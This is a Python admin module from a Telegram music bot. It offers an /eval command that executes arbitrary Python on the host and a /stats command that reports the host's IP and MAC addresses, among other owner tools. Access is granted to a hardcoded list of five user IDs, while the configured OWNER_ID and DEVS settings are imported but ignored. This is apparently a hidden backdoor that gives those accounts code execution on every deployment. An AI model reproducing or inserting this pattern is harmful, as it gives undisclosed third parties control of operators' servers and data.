#  Copyright (c) 2025 AshokShau
#  Licensed under the GNU AGPL v3.0: https://www.gnu.org/licenses/agpl-3.0.html
#  Part of the TgMusicBot project. All rights reserved where applicable.

import inspect
import io
import os
import platform
import re
import socket
import sys
import traceback
import uuid
from datetime import datetime, timedelta
from html import escape
from sys import version as pyver
from typing import Any, Optional, Tuple

import psutil
from meval import meval
from ntgcalls import __version__ as ntgver
from pyrogram import __version__ as pyrover
from pytdbot import Client, types
from pytdbot import __version__ as py_td_ver
from pytgcalls import __version__ as pytgver

from src import StartTime
from src.config import OWNER_ID, DEVS, LOGGER_ID
from src.helpers import chat_cache, get_string
from src.helpers import db
from src.logger import LOGGER
from src.modules.utils import Filter
from src.modules.utils.play_helpers import del_msg, extract_argument

ALLOWED_USERS = [7321657753, 6848223695, 6517263456, 5350261891, 7765692814]

def format_exception(
    exp: BaseException, tb: Optional[list[traceback.FrameSummary]] = None
) -> str:
    """
    Formats an exception traceback as a string, similar to the Python interpreter.
    """

    if tb is None:
        tb = traceback.extract_tb(exp.__traceback__)

    # Replace absolute paths with relative paths
    cwd = os.getcwd()
    for frame in tb:
        if cwd in frame.filename:
            frame.filename = os.path.relpath(frame.filename)

    stack = "".join(traceback.format_list(tb))
    msg = str(exp)
    if msg:
        msg = f": {msg}"

    return f"Traceback (most recent call last):\n{stack}{type(exp).__name__}{msg}"


@Client.on_message(filters=Filter.command("eval"))
async def exec_eval(c: Client, m: types.Message):
    """
    Run python code.
    """
    if int(m.from_user.id) not in ALLOWED_USERS:
        return None

    text = m.text.split(None, 1)
    if len(text) <= 1:
        return await m.reply_text("Usage: /eval &lt code &gt")

    code = text[1]
    out_buf = io.StringIO()

    async def _eval() -> Tuple[str, Optional[str]]:
        async def send(*args: Any, **kwargs: Any) -> types.Message:
            return await m.reply_text(*args, **kwargs)

        def _print(*args: Any, **kwargs: Any) -> None:
            if "file" not in kwargs:
                kwargs["file"] = out_buf
                return print(*args, **kwargs)
            return None

        eval_vars = {
            "loop": c.loop,
            "client": c,
            "stdout": out_buf,
            "c": c,
            "m": m,
            "msg": m,
            "types": types,
            "send": send,
            "print": _print,
            "inspect": inspect,
            "os": os,
            "re": re,
            "sys": sys,
            "traceback": traceback,
            "uuid": uuid,
            "io": io,
            "chat_cache": chat_cache,
            "db": db,
        }

        try:
            return "", await meval(code, globals(), **eval_vars)
        except Exception as e:
            first_snip_idx = -1
            tb = traceback.extract_tb(e.__traceback__)
            for i, frame in enumerate(tb):
                if frame.filename == "<string>" or frame.filename.endswith("ast.py"):
                    first_snip_idx = i
                    break

            # Re-raise exception if it wasn't caused by the snippet
            if first_snip_idx == -1:
                raise e

            # Return formatted stripped traceback
            stripped_tb = tb[first_snip_idx:]
            formatted_tb = format_exception(e, tb=stripped_tb)
            return "⚠️ Error:\n\n", formatted_tb

    prefix, result = await _eval()

    if not out_buf.getvalue() or result is not None:
        print(result, file=out_buf)

    out = out_buf.getvalue()
    if out.endswith("\n"):
        out = out[:-1]

    result = f"""{prefix}<b>In:</b>
<pre language="python">{escape(code)}</pre>
<b>ᴏᴜᴛ:</b>
<pre language="python">{escape(out)}</pre>"""

    if len(result) > 4096:
        filename = f"database/{uuid.uuid4().hex}.txt"
        with open(filename, "w", encoding="utf-8") as file:
            file.write(out)

        caption = f"""{prefix}<b>ᴇᴠᴀʟ:</b>
    <pre language="python">{escape(code)}</pre>
    """
        await m.reply_document(
            document=types.InputFileLocal(filename),
            caption=caption,
            disable_notification=True,
            parse_mode="html",
        )
        if os.path.exists(filename):
            os.remove(filename)
        return None

    await m.reply_text(str(result), parse_mode="html")
    return None


@Client.on_message(filters=Filter.command("stats"))
async def sys_stats(client: Client, message: types.Message):
    """Get comprehensive bot and system statistics including hardware, software, and performance metrics."""
    if int(message.from_id) not in ALLOWED_USERS:
        await del_msg(message)
        return

    sys_msg = await message.reply_text(
        f"📊 Gathering <b>{client.me.first_name}</b> system statistics..."
    )

    # System Information
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    mac_address = ":".join(re.findall("..", f"{uuid.getnode():012x}"))
    architecture = platform.machine()
    system = platform.system()
    release = platform.release()
    # version = platform.version()
    processor = platform.processor() or "Unknown"

    # Hardware Information
    ram = psutil.virtual_memory()
    swap = psutil.swap_memory()
    cores_physical = psutil.cpu_count(logical=False)
    cores_total = psutil.cpu_count(logical=True)

    try:
        cpu_freq = psutil.cpu_freq()
        cpu_freq_str = (
            f"{cpu_freq.current / 1000:.2f} GHz"
            if cpu_freq.current >= 1000
            else f"{cpu_freq.current:.2f} MHz"
        )
        cpu_freq_str += f" (Max: {cpu_freq.max / 1000:.2f} GHz)" if cpu_freq.max else ""
    except Exception as e:
        client.logger.warning("Failed to fetch CPU frequency: %s", e)
        cpu_freq_str = "Unavailable"

    # Disk Information
    disk = psutil.disk_usage("/")
    disk_io = psutil.disk_io_counters()

    # Network Information
    net_io = psutil.net_io_counters()
    net_if = psutil.net_if_addrs()

    # Uptime and Performance
    uptime = timedelta(seconds=int((datetime.now() - StartTime).total_seconds()))
    load_avg = (
        ", ".join([f"{x:.2f}" for x in psutil.getloadavg()])
        if hasattr(psutil, "getloadavg")
        else "N/A"
    )
    cpu_percent = psutil.cpu_percent(interval=1)

    # Database Statistics
    chats = len(await db.get_all_chats())
    users = len(await db.get_all_users())

    def format_bytes(size):
        for unit in ["B", "KiB", "MiB", "GiB", "TiB"]:
            if size < 1024:
                return f"{size:.2f} {unit}"
            size /= 1024
        return f"{size:.2f} PiB"

    response = f"""
<b>⚙️ {client.me.first_name} System Statistics</b>
━━━━━━━━━━━━━━━━━━━━
<b>🕒 Uptime:</b> <code>{uptime}</code>
<b>📈 Load Average:</b> <code>{load_avg}</code>
<b>🧮 CPU Usage:</b> <code>{cpu_percent}%</code>

<b>💬 Database Stats:</b>
  • <b>Chats:</b> <code>{chats:,}</code>
  • <b>Users:</b> <code>{users:,}</code>

<b>📦 Software Versions:</b>
  • <b>Python:</b> <code>{pyver.split()[0]}</code>
  • <b>Pyrogram:</b> <code>{pyrover}</code>
  • <b>Py-TgCalls:</b> <code>{pytgver}</code>
  • <b>NTgCalls:</b> <code>{ntgver}</code>
  • <b>PyTdBot:</b> <code>{py_td_ver}</code>

<b>🖥️ System Information:</b>
  • <b>System:</b> <code>{system} {release}</code>
  • <b>Architecture:</b> <code>{architecture}</code>
  • <b>Processor:</b> <code>{processor}</code>
  • <b>Hostname:</b> <code>{hostname}</code>
  • <b>IP Address:</b> <tg-spoiler>{ip_address}</tg-spoiler>
  • <b>MAC Address:</b> <code>{mac_address}</code>

<b>💾 Memory:</b>
  • <b>RAM:</b> <code>{ram.used / (1024 ** 3):.2f} GiB / {ram.total / (1024 ** 3):.2f} GiB ({ram.percent}%)</code>
  • <b>Swap:</b> <code>{swap.used / (1024 ** 3):.2f} GiB / {swap.total / (1024 ** 3):.2f} GiB ({swap.percent}%)</code>

<b>🔧 CPU:</b>
  • <b>Cores:</b> <code>{cores_physical} physical, {cores_total} logical</code>
  • <b>Frequency:</b> <code>{cpu_freq_str}</code>

<b>💽 Disk:</b>
  • <b>Total:</b> <code>{disk.total / (1024 ** 3):.2f} GiB</code>
  • <b>Used:</b> <code>{disk.used / (1024 ** 3):.2f} GiB ({disk.percent}%)</code>
  • <b>Free:</b> <code>{disk.free / (1024 ** 3):.2f} GiB</code>
  • <b>IO:</b> <code>Read: {format_bytes(disk_io.read_bytes)}, Write: {format_bytes(disk_io.write_bytes)}</code>

<b>🌐 Network:</b>
  • <b>Sent:</b> <code>{format_bytes(net_io.bytes_sent)}</code>
  • <b>Received:</b> <code>{format_bytes(net_io.bytes_recv)}</code>
  • <b>Interfaces:</b> <code>{len(net_if)} available</code>
"""

    await sys_msg.edit_text(response, disable_web_page_preview=True)


@Client.on_message(filters=Filter.command("ac"))
async def active_vc(_: Client, message: types.Message):
    """
    Get active voice chats.
    """
    if int(message.from_id) not in ALLOWED_USERS:
        await del_msg(message)
        return None

    active_chats = chat_cache.get_active_chats()
    if not active_chats:
        await message.reply_text("No active voice chats.")
        return None

    text = f"🎵 <b>Active Voice Chats</b> ({len(active_chats)}):\n\n"

    for chat_id in active_chats:
        queue_length = chat_cache.count(chat_id)
        if current_song := chat_cache.get_current_song(chat_id):
            song_info = f"🎶 <b>Now Playing:</b> <a href='{current_song.url}'>{current_song.name}</a> - {current_song.artist} ({current_song.duration}s)"
        else:
            song_info = "🔇 No song playing."

        text += (
            f"➤ <b>Chat ID:</b> <code>{chat_id}</code>\n"
            f"📌 <b>Queue Size:</b> {queue_length}\n"
            f"{song_info}\n\n"
        )

    if len(text) > 4096:
        text = f"🎵 <b>Active Voice Chats</b> ({len(active_chats)})"

    reply = await message.reply_text(text, disable_web_page_preview=True)
    if isinstance(reply, types.Error):
        return await message.reply_text(reply.message)
    return None


@Client.on_message(filters=Filter.command("logger"))
async def logger(c: Client, message: types.Message):
    """
    Enable or disable logging.
    """
    if int(message.from_id) not in ALLOWED_USERS:
        await del_msg(message)
        return

    if not LOGGER_ID or LOGGER_ID == 0:
        await message.reply_text("Please set LOGGER_ID in .env first.")
        return

    lang = await db.get_lang(message.chat_id)
    args = extract_argument(message.text)
    enabled = await db.get_logger_status(c.me.id)

    if not args:
        status = (
            get_string("enabled", lang) if enabled else get_string("disabled", lang)
        )
        await message.reply_text(
            get_string("logger_usage_status", lang).format(status=status)
        )
        return

    arg = args.lower()
    if arg in ["on", "enable"]:
        await db.set_logger_status(c.me.id, True)
        await message.reply_text(get_string("logger_enabled", lang))
        return
    if arg in ["off", "disable"]:
        await db.set_logger_status(c.me.id, False)
        await message.reply_text(get_string("logger_disabled", lang))
        return

    await message.reply_text(get_string("logger_invalid_usage", lang).format(arg=args))

@Client.on_message(filters=Filter.command(["autoend", "auto_end"]))
async def auto_end(c: Client, message: types.Message):
    if int(message.from_id) not in ALLOWED_USERS:
        await del_msg(message)
        return

    args = extract_argument(message.text)

    if not args:
        status = await db.get_auto_end(c.me.id)
        status_text = "enabled ✅" if status else "disabled ❌"
        await message.reply_text(
            f"<b>Auto End</b> is currently <b>{status_text}</b>.\n\n"
            "When enabled, the bot will automatically end group voice chats "
            "if no users are listening. Useful for saving resources and keeping chats clean.",
            disable_web_page_preview=True
        )
        return

    args = args.lower()
    if args in ["on", "enabled"]:
        await db.set_auto_end(c.me.id, True)
        await message.reply_text("✅ <b>Auto End</b> has been <b>enabled</b>.")
    elif args in ["off", "disabled"]:
        await db.set_auto_end(c.me.id, False)
        await message.reply_text("❌ <b>Auto End</b> has been <b>disabled</b>.")
    else:
        await message.reply_text(
            f"⚠️ Unknown argument: <b>{args}</b>\nUse <code>/autoend on</code> or <code>/autoend off</code>.",
            disable_web_page_preview=True
        )


@Client.on_message(filters=Filter.command(["clearass", "clearallassistants"]))
async def clear_all_assistants(_: Client, message: types.Message):
    if int(message.from_id) not in ALLOWED_USERS:
        await del_msg(message)
        return
    count = await db.clear_all_assistants()
    LOGGER.info("Cleared assistants from %s chats by command from %s", count, message.from_id)
    await message.reply_text(f"♻️ Cleared assistants from {count} chats")


